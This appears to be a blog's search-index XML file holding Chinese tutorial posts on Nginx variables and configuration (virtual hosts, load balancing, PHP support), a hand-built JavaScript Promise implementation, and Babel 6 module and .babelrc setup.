<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Nginx常用变量]]></title>
    <url>%2F2019%2F10%2F25%2FNginx_Nginx%E5%B8%B8%E7%94%A8%E5%8F%98%E9%87%8F%2F</url>
    <content type="text"><![CDATA[Nginx常用变量$arg_PARAMETER1这个变量包含在查询字符串时GET请求PARAMETER的值 $args1这个变量等于请求行中的参数(uri参数) $binary_remote_addr1二进制码形式的客户端地址 $body_bytes_sent1传送页面的字节数 $content_length1请求头中的Content-length字段 $content_type1请求头中的Content-Type字段 $cookie_COOKIE1cookie COOKIE的值 $document_uri1与$uri相同,获取uri,这个uri不带有参数,如果想要完整的带有参数的uri,请使用$request_uri $host1请求中的主机头字段,如果请求中的主机头不可用,则为服务器处理请求的服务器名称. $nginx_version1当前运行的nginx版本号 $query_string1与$args相同,都是获取所有uri参数 $remote_addr1客户端的ip地址 $remote_user1通过Auth Basic Module验证的用户名 $request_filename1当前连接请求的文件路径,由root或alias指令与URI请求生成 $request_body1客户端请求的请求主体信息 $request_body_file1客户端请求主体信息的临时文件名 $request_method1客户端请求的动作(方式),通常为GET或POST $request_uri1获取完整的uri请求.包含请求参数 $scheme12HTTP方法(如http,https),在location配置重定向的时候也许用的上,比如:rewrite $scheme://$http_host$request_uri $server_name1服务器名称 $server_addr12服务器地址,在完成一次系统调用后可以确定这个值,如果想要绕开系统调用,则必须在listen中指定地址并且使用bind参数 $server_port1请求到达服务器的端口号 $uri1当前请求中的当前URI(不带请求参数,参数位于$args)]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nginx配置详情]]></title>
    <url>%2F2019%2F10%2F24%2FNginx_Nginx%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[Nginx配置详情一、Nginx1.16.0的安装Nginx1.16.0安装详见 CentOS7.3编译安装LNMP之(一)Nginx-1.16.0安装 本文以nginx1.16.0编译安装版为例，目录如下 /usr/local/nginx/ nginx的安装目录/usr/local/nginx/conf/ nginx的配置目录/usr/local/nginx/conf/nginx.conf 默认的主配置文件/usr/local/nginx/html/ 默认站点/usr/local/nginx/conf/vhost/ 我们自己创建的专门用来放置虚拟主机的配置文件的目录 二、nginx配置文件一般包含以下模块：1、main全局模块：配置Nginx用户（组）、worker process数、进程PID存放路径、日志的存放路径等配置2、events模块：配置影响nginx服务器或与用户的网络连接，有每个进程的最大连接数，选取哪种事件驱动模型处理连接请求，是否允许同时接受多个网路连接，开启多个网络连接序列化等3、http模块：可以嵌套多个server，配置代理，缓存，日志定义等绝大多数功能和第三方模块的配置。3-1、http全局模块：如mime-type定义，日志自定义，是否使用sendfile传输文件，连接超时时间，单连接请求数等3-2、server模块：配置虚拟主机的相关参数，一个http中可以有多个server3-2-1、server全局模块：配置站点的端口号、域名、目录等3-2-2、location模块：配置请求的路由，以及各种页面的处理情况 具体内容详情如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114### 每个指令必须有分号结束，用#号注释， 注释部分为可选项，未注释的为必须的 #### main全局块：配置影响nginx全局的指令。一般有运行nginx服务器的用户组，nginx进程pid存放路径，日志存放路径，配置文件引入，允许生成worker process数等。#user nginx nginx; #配置用户或者组，默认为nobody nobody。worker_processes 1; #允许生成的进程数，默认为1， 最大为cpu核数或者cup核数的两倍#制定日志路径，级别。这个设置可以放入全局块，http块，server块，级别以此为：debug|info|notice|warn|error|crit|alert|emerg#error_log logs/error.log;#error_log logs/error.log notice;#error_log logs/error.log info;#pid logs/nginx.pid; #指定nginx进程运行文件存放地址#最大文件打开数（连接），可设置为系统优化后的ulimit -HSn的结果#worker_rlimit_nofile 51200;#cpu亲和力配置，让不同的进程使用不同的cpu#worker_cpu_affinity 0001 0010 0100 1000 0001 00100100 1000;#2、events块：配置影响nginx服务器或与用户的网络连接。有每个进程的最大连接数，选取哪种事件驱动模型处理连接请求，是否允许同时接受多个网路连接，开启多个网络连接序列化等。events &#123; use epoll; #epoll是多路复用IO(I/O Multiplexing)中的一种方式,但是仅用于linux2.6以上内核,可以大大提高nginx的性能 #accept_mutex on; #设置网路连接序列化，防止惊群现象发生，默认为on #multi_accept on; #设置一个进程是否同时接受多个网络连接，默认为off worker_connections 1024; #单个后台worker process进程的最大并发链接数&#125;#3、http块：可以嵌套多个server（每个server为一个站点），配置代理，缓存，日志定义等绝大多数功能和第三方模块的配置。如文件引入，mime-type定义，日志自定义，是否使用sendfile传输文件，连接超时时间，单连接请求数等。http &#123; include mime.types; #文件扩展名与类型映射表。来查看mime.types文件内容，我们发现其就是一个types结构，里面包含了各种浏览器能够识别的MIME类型以及对应类型的文件后缀名字 default_type application/octet-stream; #默认文件类型，默认为text/plain #log_format main &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos; # &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos; # &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;; #access_log logs/access.log main; #自定义服务日志 sendfile on; #允许sendfile方式传输文件，默认为on，表示高效文件传输模式，可以在http块，server块，location块。 #sendfile_max_chunk 100k; #每个进程每次调用传输数量不能大于设定的值，默认为0，即不设上限。 #tcp_nopush on; #激活tcp_nopush参数可以允许把httpresponse header和文件的开始放在一个文件里发布，积极的作用是减少网络报文段的数量 # tcp_nodelay on; #激活tcp_nodelay，内核会等待将更多的字节组成一个数据包，从而提高I/O性能 #keepalive_timeout 0; #设置长连接超时时间，默认为75s，可以在http，server，location块。 keepalive_timeout 65; #gzip on; #gzip_min_length 1k; #gzip on开启才有效，设置允许压缩的页面最小字节数，页面字节数从header头的Content-Length中获取。默认值是0，表示不管页面多大都进行压缩。建议设置成大于1K。如果小于1K可能会越压越大 #upstream表示负载服务器池，定义名字为backend_server的服务器池# upstream myweb &#123;# server 118.24.241.124 [weight=1 max_fails=2 fail_timeout=30s];# server 106.12.2.195:8081 [weight=1 max_fails=2 fail_timeout=30s];# server 106.12.2.195:8082 [weight=1 max_fails=2 fail_timeout=30s];# server 106.12.2.195:8083 [weight=1 max_fails=2 fail_timeout=30s];# &#125;#设置由 fail_timeout 定义的时间段内连接该主机的失败次数，以此来断定 fail_timeout 定义的时间段内该主机是否可用。默认情况下这个数值设置为 1。零值的话禁用这个数量的尝试。设置在指定时间内连接到主机的失败次数，超过该次数该主机被认为不可用。这里是在30s内尝试2次失败即认为主机不可用！ #基于域名的虚拟主机 server &#123; listen 80; #端口号， server_name localhost; #域名 多个用空格隔开， 也可以是IP地址如 #root /home/wwwroot/qinser #站点根目录，可以是相对路径，也可以是绝对路径，此项目也可以放置的到 location /&#123; &#125;里配置 #index index.php index.html index.htm; #设置默认页 此项目也可以放置的到 location /&#123; &#125;里配置 #charset koi8-r; #access_log logs/host.access.log main; location / &#123; # proxy_pass http://myweb; proxy_pass #请求转向myweb定义的服务器列表， 用于负载均衡，如果开启了，那么此处自己的站点就不能访问了 root /home/wwwroot/qinser; index index.php index.html index.htm; &#125; #error_page 404 /404.html; # redirect server error pages to the static page /50x.html # error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root html; &#125; # proxy the PHP scripts to Apache listening on 127.0.0.1:80 # #location ~ \.php$ &#123; # proxy_pass http://127.0.0.1; #&#125; # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000 # 支持PHP配置模块 #符合php扩展名的请求调度到fcgi server location ~ \.php$ &#123; #root /home/wwwroot/qinser; #上面已经配置过了，这里就不用配置了 fastcgi_pass 127.0.0.1:9000; #因为php-fpm启用的是9000端口，因此这里表示抛给本机的9000端口 fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /usr/local/nginx/html$fastcgi_script_name; include fastcgi_params; &#125; # deny access to .htaccess files, if Apache&apos;s document root # concurs with nginx&apos;s one # #location ~ /\.ht &#123; # deny all; #&#125; &#125; #每个站点都需要配置一个server模块,为了方便管理，这里把每个站点的配置文件统一放入到./vhost/目录下，并统一使用 .conf为后缀。 include /usr/local/nginx/conf/vhost/*.conf&#125; 三、配置虚拟站点 创建一个虚拟站点，域名为my.niuxitong.com, 站点根目录为/home/wwwroot/niuxitong/。1、创建站点目录及文件 123456789101112# mkdir -p /home/wwwroot/niuxitong/# vim index.html输入内容如下&lt;html&gt; &lt;head&gt; &lt;title&gt;mytest&lt;/title&gt; &lt;/head&gt; &lt;body&gt; this is my test site!!! &lt;/body&gt;&lt;/html&gt; 2、创建配置文件配置文件名为my.niuxitong.com.conf 位于/usr/local/nginx/conf/vhost/下。(确保在nginx主配置文件里include进来了) 12345678910111213141516171819# vim /usr/local/nginx/conf/vhost/my.niuxitong.com.conf输入如下内容：（最基本的配置）server &#123; listen 80; server_name my.niuxitong.com; root /home/wwwroot/niuxitong; # 设置默认文件名 index index.html index.htm default.html default.htm;&#125;检查配置文件有没有语法错误# nginx -t重启nginx# service nginx restart 3、在你本地C:\Windows\System32\drivers\etc\下的hosts文件里添加如下域名106.12.2.195 my.niuxitong.com 访问：http://my.niuxitong.com/ OK配置成功 四、配置负载均衡服务器由于本人只有两台服务器：106.12.2.195 为主服务器118.24.241.124 ：为从服务器 一主服务器的默认站点为负载， 并在主服务器上创建两个虚拟站点106.12.2.195:8081 和 106.12.2.195:8082: 。通过默认站点分发到 118.24.241.124、106.12.2.195:8081、106.12.2.195:8082 这三个站点上： 1、在主服务器上分别建立两个虚拟站点：分别位于/home/wwwroot/weba、/home/wwwroot/webb两个目录下，配置文件如下： 12345678910111213141516171819# vim 106.12.2.195:8081.conf内容如下：server &#123; listen 8081; server_name 106.12.2.195:8081; root /home/wwwroot/weba; index index.html index.htm default.html defaut.htm;&#125;# vim 106.12.2.195:8082.conf内容如下：server &#123; listen 8082; server_name 106.12.2.195:8082; root /home/wwwroot/webb; index index.html index.htm default.html defaut.htm;&#125; 2、在主服务器的默认配置文件./nginx.conf设置如下内容 123456789101112131415161718192021222324##主站点的配置如下：http &#123; ... ... #配置负载均衡 #upstream 表示负载均衡服务器池 定义名字为mywebs的服务器池 upstream mywebs&#123; server 118.24.241.124; server 106.12.2.195:8081; server 106.12.2.195:8082; &#125; ... ... server &#123; location / &#123; proxy_pass http://mywebs; //转发到名为mywebs的服务器池中 ... &#125; &#125;&#125; 3、重启nginx 4、访问http://106.12.2.195/ 不停的刷新，在三个站点之间来回切换。 OK负载均衡搭建成功 5、模拟测试其中一台服务器宕机的情形 把118.24.241.124 这台服务器nginx关闭 ，这时我们刷新http://106.12.2.195/ 只在weba、webb两个站点之间切换。 五、设置目录列表默认情况下，如果没有对应的索引文件，如果我们直接访问，会报403 Forbidden错误的。可以通过autoindex on;属性来设置列目录 此属性可以在http全局块设置，对所有站点有效。也可以在server全局块设置，对当前站点有效 演示：在my.niuxitong.com站点模块设置1234567# vim /usr/local/nginx/conf/vhost/my.niuxitong.com.conf在server全局块加入如下三行 autoindex on; #开启目录列表 autoindex_exact_size on; #默认值为off 以kB、mB、GB显示文件的大概大小， 如果设置为on则精准显示文件的大小 autoindex_localtime on; #默认值为on 表示显示文件最后一次被修改的服务器时间（格林尼治时间） 把默认索引文件名 index.html 修改为 index2.html; 访问 http://my.niuxitong.com/ 显示如图： 六、让nginx支持PHPPHP-7.2.18安装 详见 CentOS7.3编译安装LNMP之(三)PHP-7.2.18安装 仍以上文提到的my.niuxitong.com站点为例，PHP安装部署好以后，在./vhost/my.niuxitong.com.conf配置文件内添加如下内容 123456789101112131415161718server &#123; listen 80; server_name my.niuxitong.com; root /home/wwwroot/niuxitong; index index.php index.html ....; #默认文件增加一个index.php .... #设置使nginx支持PHP location ~ \.php$ &#123; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /home/wwwroot/niuxitong$fastcgi_script_name; include fastcgi_params; &#125;&#125; 在此站点目录创建 index.php文件123&lt;?php phpinfo();?&gt;]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ECMA-Promise源码]]></title>
    <url>%2F2019%2F08%2F08%2FECMA-promise%E6%BA%90%E7%A0%81%2F</url>
    <content type="text"><![CDATA[背景，本篇文章主要在于探究 Promise 的实现原理，带领大家一步一步实现一个 Promise , 不对其用法做说明，如果读者还对Promise的用法不了解，可以查看阮一峰老师的 源码如下123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235let executeAsync;if (typeof process === 'object' &amp;&amp; process.nextTick) &#123; executeAsync = process.nextTick;&#125; else if (typeof setImmediate === 'function') &#123; executeAsync = setImmediate;&#125; else &#123; executeAsync = function (fn) &#123; setTimeout(fn, 0); &#125;;&#125;function callAsync(fn, arg, callback, onError) &#123; executeAsync(function () &#123; try &#123; callback ? callback(fn(arg)) : fn(arg); &#125; catch (e) &#123; onError(e); &#125; &#125;);&#125;// 判断变量否为functionconst isFunction = variable =&gt; typeof variable === 'function';// 定义Promise的三种状态常量const PENDING = 'pending';const FULFILLED = 'fulfilled';const REJECTED = 'rejected';class MyPromise &#123; constructor(handle) &#123; if (!isFunction(handle)) &#123; throw new Error('MyPromise must accept a function as a parameter'); &#125; // 添加状态 this._status = PENDING; // 添加状态 this._value = null; // 添加成功回调函数队列 this._fulfilledQueue = []; // 添加失败回调函数队列 this._rejectedQueue = []; // 执行handle try &#123; handle(this._resolve.bind(this), this._reject.bind(this)); &#125; catch (err) &#123; this._reject(err); &#125; &#125; // 添加resovle时执行的函数 _resolve(val) &#123; if (this._status !== PENDING) return; this._status = FULFILLED; // 依次执行成功队列中的函数，并清空队列 const runFulfilled = (value) =&gt; &#123; let cb; cb = this._fulfilledQueue.shift(); while (cb) &#123; cb(value); cb = this._fulfilledQueue.shift(); &#125; &#125;; // 依次执行失败队列中的函数，并清空队列 const runRejected = (error) =&gt; &#123; let cb; cb = this._rejectedQueue.shift(); while (cb) &#123; cb(error); cb = this._rejectedQueue.shift(); &#125; &#125;; /* 如果resolve的参数为Promise对象，则必须等待该Promise对象状态改变后, 当前Promsie的状态才会改变，且状态取决于参数Promsie对象的状态 */ if (val instanceof MyPromise) &#123; val.then(value =&gt; &#123; this._value = value; runFulfilled(value); &#125;, err =&gt; &#123; this._value = err; runRejected(err); &#125;); &#125; else &#123; this._value = val; runFulfilled(val); &#125; &#125; // 添加reject时执行的函数 _reject(err) &#123; if (this._status !== PENDING) return; // 依次执行失败队列中的函数，并清空队列 this._status = REJECTED; this._value = err; let cb; cb = this._rejectedQueue.shift(); while (cb) &#123; cb(err); cb = this._rejectedQueue.shift(); &#125; &#125; // 添加then方法 then(onFulfilled, onRejected) &#123; // 返回一个新的Promise对象 return new MyPromise((onFulfilledNext, onRejectedNext) =&gt; &#123; // 封装一个成功时执行的函数 let fulfilled = value =&gt; &#123; if (isFunction(onFulfilled)) &#123; callAsync(onFulfilled, value, res =&gt; &#123; if (res instanceof MyPromise) &#123; // 如果当前回调函数返回MyPromise对象，必须等待其状态改变后在执行下一个回调 res.then(onFulfilledNext, onRejectedNext); &#125; else &#123; // 否则会将返回结果直接作为参数，传入下一个then的回调函数，并立即执行下一个then的回调函数 onFulfilledNext(res); &#125; &#125;, onRejectedNext); &#125; else &#123; try &#123; onFulfilledNext(value); &#125; catch (err) &#123; // 如果函数执行出错，新的Promise对象的状态为失败 onRejectedNext(err); &#125; &#125; &#125;; // 封装一个失败时执行的函数 let rejected = error =&gt; &#123; if (isFunction(onRejected)) &#123; callAsync(onRejected, error, res =&gt; &#123; if (res instanceof MyPromise) &#123; // 如果当前回调函数返回MyPromise对象，必须等待其状态改变后在执行下一个回调 res.then(onFulfilledNext, onRejectedNext); &#125; else &#123; // 否则会将返回结果直接作为参数，传入下一个then的回调函数，并立即执行下一个then的回调函数 onFulfilledNext(res); &#125; &#125;, onRejectedNext); &#125; else &#123; try &#123; onRejectedNext(error); &#125; catch (err) &#123; // 如果函数执行出错，新的Promise对象的状态为失败 onRejectedNext(err); &#125; &#125; &#125;; switch (this._status) &#123; // 当状态为pending时，将then方法回调函数加入执行队列等待执行 case PENDING: this._fulfilledQueue.push(fulfilled); this._rejectedQueue.push(rejected); break; // 当状态已经改变时，立即执行对应的回调函数 case FULFILLED: fulfilled(this._value); break; case REJECTED: rejected(this._value); break; &#125; &#125;); &#125; // 添加catch方法 catch(onRejected) &#123; return this.then(null, onRejected); &#125; // 添加静态resolve方法 static resolve(value) &#123; // 如果参数是MyPromise实例或thenable对象，直接返回value return value instanceof MyPromise || (value &amp;&amp; isFunction(value.then)) ? value : new MyPromise(resolve =&gt; resolve(value)); &#125; // 添加静态reject方法 static reject(value) &#123; return new MyPromise((resolve, reject) =&gt; reject(value)); &#125; // 添加静态all方法 static all(list) &#123; return new MyPromise((resolve, reject) =&gt; &#123; let values = []; let count = list.length; for (let i in list) &#123; // 数组参数如果不是MyPromise实例，先调用MyPromise.resolve this.resolve(list[i]).then(res =&gt; &#123; values[i] = res; // 所有状态都变成fulfilled时返回的MyPromise状态就变成fulfilled --count &lt; 1 &amp;&amp; resolve(values); &#125;, reject); &#125; &#125;); &#125; // 添加静态race方法 static race(list) &#123; return new MyPromise((resolve, reject) =&gt; &#123; for (let p of list) &#123; // 只要有一个实例率先改变状态，新的MyPromise的状态就跟着改变 this.resolve(p).then(res =&gt; &#123; resolve(res); &#125;, reject); &#125; &#125;); &#125; finally(cb) &#123; return this.then( value =&gt; MyPromise.resolve(cb()).then(() =&gt; value), reason =&gt; MyPromise.resolve(cb()).then(() =&gt; &#123; throw reason; &#125;) ); &#125;&#125;// 测试代码new MyPromise(resolve =&gt; &#123; console.log(1); resolve(3); MyPromise.resolve().then(() =&gt; console.log(4)).then(() =&gt; console.log(5));&#125;).then(num =&gt; &#123; console.log(num);&#125;).then(() =&gt; &#123; console.log(6);&#125;);console.log(2);// 依次输出：1 2 4 3 5 6]]></content>
      <categories>
        <category>ECMA</category>
      </categories>
      <tags>
        <tag>ECMA</tag>
        <tag>Prmise</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[综合-babel配置]]></title>
    <url>%2F2018%2F09%2F06%2F%E7%BB%BC%E5%90%88-babel%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[背景说起ES6，webpack，打包，模块化总是离不开babel，babel作为一个js的编译器已经被广泛使用。在babel的官网是这样介绍它的： babel is a JavaScript compiler. Use next generation JavaScript, today. 大家都知道js作为宿主语言，很依赖执行的环境（浏览器、node等），不同环境对js语法的支持不尽相同，特别是ES6之后，ECMAScrip对版本的更新已经到了一年一次的节奏，虽然每年更新的幅度不大，但是每年的提案可不少。babel的出现就是为了解决这个问题，把那些使用新标准编写的代码转译为当前环境可运行的代码，简单点说就是把ES6代码转译（转码+编译）到ES5。 经常有人在使用babel的时候并没有弄懂babel是干嘛的，只知道要写ES6就要在webpack中引入一个babel-loader，然后胡乱在网上copy一个.babelrc到项目目录就开始了（ps: 其实我说的是我自己）。理解babel的配置很重要，可以避免一些不必要的坑，比如：代码中使用Object.assign在一些低版本浏览器会报错，以为是webpack打包时出现了什么问题，其实是babel的配置问题。 ES6正文之前先谈谈ES6，ES即ECMAScript，6表示第六个版本(也被称为是ES2015，因为是2015年发布的)，它是javascript的实现标准。 被纳入到ES标准的语法必须要经过如下五个阶段: 1.Stage 0: strawman 2.Stage 1: proposal 3.Stage 2: draft - 必须包含2个实验性的具体实现，其中一个可以是用转译器实现的，例如Babel。 4.Stage 3: candidate - 至少要有2个符合规范的具体实现。 5.Stage 4: finished 可以看到提案在进入stage3阶段时就已经在一些环境被实现，在stage2阶段有babel的实现。所以被纳入到ES标准的语法其实在大部分环境都已经是有了实现的，那么为什么还要用babel来进行转译，因为不能确保每个运行代码的环境都是最新版本并已经实现了规范。 更多关于ES6的内容可以参考hax的live:Hax：如何学习和实践ES201X？ Babel的版本变更写这篇文章时babel版本已经到了v7.0.0-beta.3,也就是说7.0的正式版就要发布了，可喜可贺。但是今天不谈7.0，只谈babel6，在我知道并开始使用的babel的时候babel已经到了版本6，没有经历过5的时代。 在babel5的时代，babel属于全家桶型，只要安装babel就会安装babel相关的所有工具，即装即用。 但是到了babel6，具体有以下几点变更： 移除babel全家桶安装，拆分为单独模块，例如：babel-core、babel-cli、babel-node、babel-polyfill等；可以在babel的github仓库看到babel现在有哪些模块。babel-package 新增 .babelrc 配置文件，基本上所有的babel转译都会来读取这个配置； 新增 plugin 配置，所有的东西都插件化，什么代码要转译都能在插件中自由配置； 新增 preset 配置，babel5会默认转译ES6和jsx语法，babel6转译的语法都要在perset中配置，preset简单说就是一系列plugin包的使用。 babel各个模块介绍babel6将babel全家桶拆分成了许多不同的模块，只有知道这些模块怎么用才能更好的理解babel。 下面的一些示例代码已经上传到了github，欢迎访问，欢迎star。 安装方式： 12345#通过npm安装npm install babel-core babel-cli babel-node#通过yarn安装yarn add babel-core babel-cli babel-node 1、babel-core看名字就知道，babel-core是作为babel的核心存在，babel的核心api都在这个模块里面，比如：transform。 下面介绍几个babel-core中的api babel.transform：用于字符串转码得到AST 12345678910111213/* * @param &#123;string&#125; code 要转译的代码字符串 * @param &#123;object&#125; options 可选，配置项 * @return &#123;object&#125;*/babel.transform(code: string, options?: Object)//返回一个对象(主要包括三个部分)：&#123; generated code, //生成码 sources map, //源映射 AST //即abstract syntax tree，抽象语法树&#125; 更多关于AST知识点请看这里。 一些使用babel插件的打包或构建工具都有使用到这个方法，下面是一些引入babel插件中的源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960//gulp-babelconst babel = require('babel-core');/*some codes...*/module.exports = function (opts) &#123; opts = opts || &#123;&#125;; return through.obj(function (file, enc, cb) &#123; try &#123; const fileOpts = Object.assign(&#123;&#125;, opts, &#123; filename: file.path, filenameRelative: file.relative, sourceMap: Boolean(file.sourceMap), sourceFileName: file.relative, sourceMapTarget: file.relative &#125;); const res = babel.transform(file.contents.toString(), fileOpts); if (res !== null) &#123; //some codes &#125; &#125; catch (err) &#123; //some codes &#125; &#125;&#125;//babel-loadervar babel = require("babel-core");/*some codes...*/var transpile = function transpile(source, options) &#123; //some code try &#123; result = babel.transform(source, options); &#125; catch (error) &#123; //some codes &#125; //some codes&#125;//rollup-pugin-babelimport &#123; buildExternalHelpers, transform &#125; from 'babel-core';/*some codes...*/export default function babel ( options ) &#123; //some codes return &#123; // some methods transform ( code, id ) &#123; const transformed = transform( code, localOpts ); //some codes return &#123; code: transformed.code, map: transformed.map &#125;; &#125; &#125;&#125; 上面是一些打包工具引入babel插件时的一些源码，可以看到基本都是先通过调用transform方法进行代码转码。 babel.transformFile 1234//异步的文件转码方式，回调函数中的result与transform返回的对象一至。babel.transformFile("filename.js", options, function (err, result) &#123; result; // =&gt; &#123; code, map, ast &#125;&#125;); babel.transformFileSync 12345//同步的文件转码方式，返回结果与transform返回的对象一至。babel.transformFileSync(filename, options) // =&gt; &#123; code, map, ast &#125;babel.transformFromAst//将ast进行转译const &#123; code, map, ast &#125; = babel.transformFromAst(ast, code, options); 2、babel-clibabel-cli是一个通过命令行对js文件进行换码的工具。 使用方法： 直接在命令行输出转译后的代码 1babel script.js 指定输出文件 123babel script.js --out-file build.js或者是babel script.js -o build.js 让我们来编写了一个具有箭头函数的代码：12//script.jsconst array = [1,2,3].map((item, index) =&gt; item * 2); 然后在命令行执行 babel script.js，发现输出的代码好像没有转译。 因为我们没有告诉babel要转译哪些类型，现在看看怎么指定转译代码中的箭头函数。1babel --plugins transform-es2015-arrow-functions script.js 或者在目录里添加一个.babelrc文件，内容如下：12345&#123; "plugins": [ "transform-es2015-arrow-functions" ]&#125; .babelrc是babel的全局配置文件，所有的babel操作（包括babel-core、babel-node）基本都会来读取这个配置，后面会详细介绍。 3、babel-nodebabel-node是随babel-cli一起安装的，只要安装了babel-cli就会自带babel-node。在命令行输入babel-node会启动一个REPL（Read-Eval-Print-Loop），这是一个支持ES6的js执行环境。 其实不用babel-node，直接在node下，只要node版本大于6大部分ES6语法已经支持，况且现在node的版本已经到了8.7.0。 babel-node还能直接用来执行js脚本，与直接使用node命令类似，只是会在执行过程中进行babel的转译，并且babel官方不建议在生产环境直接这样使用，因为babel实时编译产生的代码会缓存在内存中，导致内存占用过高，所以我们了解了解就好。1babel-node script.js 4、babel-registerbabel-register字面意思能看出来，这是babel的一个注册器，它在底层改写了node的require方法，引入babel-register之后所有require并以.es6, .es, .jsx 和 .js为后缀的模块都会经过babel的转译。 同样通过箭头函数做个实验：1234567891011//test.jsconst name = &apos;shenfq&apos;;module.exports = () =&gt; &#123; const json = &#123;name&#125;; return json;&#125;;//main.jsrequire(&apos;babel-register&apos;);var test = require(&apos;./test.js&apos;); //test.js中的es6语法将被转译成es5console.log(test.toString()); //通过toString方法，看看控制台输出的函数是否被转译 默认babel-register会忽略对node_modules目录下模块的转译，如果要开启可以进行如下配置。123require("babel-register")(&#123; ignore: false&#125;); babel-register与babel-core会同时安装，在babel-core中会有一个register.js文件，所以引入babel-register有两种方法：12require('babel-core/register');require('babel-register'); 但是官方不推荐第一种方法，因为babel-register已经独立成了一个模块，在babel-core的register.js文件中有如下注释。 TODO: eventually deprecate this console.trace(“use the babel-register package instead of babel-core/register“); 5、babel-polyfillpolyfill这个单词翻译成中文是垫片的意思，详细点解释就是桌子的桌脚有一边矮一点，拿一个东西把桌子垫平。polyfill在代码中的作用主要是用已经存在的语法和api实现一些浏览器还没有实现的api，对浏览器的一些缺陷做一些修补。例如Array新增了includes方法，我想使用，但是低版本的浏览器上没有，我就得做兼容处理：1234567891011121314151617181920212223if (!Array.prototype.includes) &#123; Object.defineProperty(Array.prototype, 'includes', &#123; value: function(searchElement, fromIndex) &#123; if (this == null) &#123; throw new TypeError('"this" is null or not defined'); &#125; var o = Object(this); var len = o.length &gt;&gt;&gt; 0; if (len === 0) &#123; return false; &#125; var n = fromIndex | 0; var k = Math.max(n &gt;= 0 ? n : len - Math.abs(n), 0); while (k &lt; len) &#123; if (o[k] === searchElement) &#123; return true; &#125; k++; &#125; return false; &#125; &#125;);&#125; 上面简单的提供了一个includes方法的polyfill，代码来自MDN。 理解polyfill的意思之后，再来说说babel为什么存在polyfill。因为babel的转译只是语法层次的转译，例如箭头函数、解构赋值、class，对一些新增api以及全局函数（例如：Promise）无法进行转译，这个时候就需要在代码中引入babel-polyfill，让代码完美支持ES6+环境。前面介绍的babel-node就会自动在代码中引入babel-polyfill包。 引入方法：12345678910//在代码的最顶部进行require或者importrequire("babel-polyfill");import "babel-polyfill";//如果使用webpack，也可以在文件入口数组引入module.exports = &#123; entry: ["babel-polyfill", "./app/js"]&#125;; 但很多时候我们并不会使用所有ES6+语法，全局添加所有垫片肯定会让我们的代码量上升，之后会介绍其他添加垫片的方式。 .babelrc前面已经介绍了babel常用的一些模块，接下来看看babel的配置文件 .babelrc。 后面的后缀rc来自linux中，使用过linux就知道linux中很多rc结尾的文件，比如.bashrc，rc是run command的缩写，翻译成中文就是运行时的命令，表示程序执行时就会来调用这个文件。 babel所有的操作基本都会来读取这个配置文件，除了一些在回调函数中设置options参数的，如果没有这个配置文件，会从package.json文件的babel属性中读取配置。 plugins先简单介绍下 plugins ，babel中的插件，通过配置不同的插件才能告诉babel，我们的代码中有哪些是需要转译的。 这里有一个babel官网的插件列表，里面有目前babel支持的全部插件。 举个例子：123456789101112131415&#123; "plugins": [ "transform-es2015-arrow-functions", //转译箭头函数 "transform-es2015-classes", //转译class语法 "transform-es2015-spread", //转译数组解构 "transform-es2015-for-of" //转译for-of ]&#125;//如果要为某个插件添加配置项，按如下写法：&#123; "plugins":[ //改为数组，第二个元素为配置项 ["transform-es2015-arrow-functions", &#123; "spec": true &#125;] ]&#125; 上面这些都只是语法层次的转译，前面说过有些api层次的东西需要引入polyfill，同样babel也有一系列插件来支持这些。1234567891011121314151617&#123; "plugins":[ //如果我们在代码中使用Object.assign方法，就用如下插件 "transform-object-assign" ]&#125;//写了一个使用Object.assign的代码如下：const people = Object.assign(&#123;&#125;, &#123; name: 'shenfq'&#125;);//经过babel转译后如下：var _extends = Object.assign || function (target) &#123; for (var i = 1; i &lt; arguments.length; i++) &#123; var source = arguments[i]; for (var key in source) &#123; if (Object.prototype.hasOwnProperty.call(source, key)) &#123; target[key] = source[key]; &#125; &#125; &#125; return target; &#125;;const people = _extends(&#123;&#125;, &#123; name: 'shenfq'&#125;); 这种通过transform添加的polyfill只会引入到当前模块中，试想实际开发中存在多个模块使用同一个api，每个模块都引入相同的polyfill，大量重复的代码出现在项目中，这肯定是一种灾难。另外一个个的引入需要polyfill的transform挺麻烦的，而且不能保证手动引入的transform一定正确，等会会提供一个解决方案：transform-runtime。 除了添加polyfill，babel还有一个工具包helpers，如果你有安装babel-cli，你可以直接通过下面的命令把这个工具包输出：1./node_modules/.bin/babel-external-helpers &gt; helpers.js 这个工具包类似于babel的utils模块，就像我们项目中的utils一样，很多地方都会用到，例如babel实现Object.assign就是使用的helpers中的_extend方法。为了避免同一个文件多次引用babel的助手函数，通过external-helpers插件，能够把这些助手函数抽出放到文件顶部，避免多次引用。 123456//安装： cnpm install --save-dev babel-plugin-external-helpers//配置&#123; "plugins": ["external-helpers"]&#125; 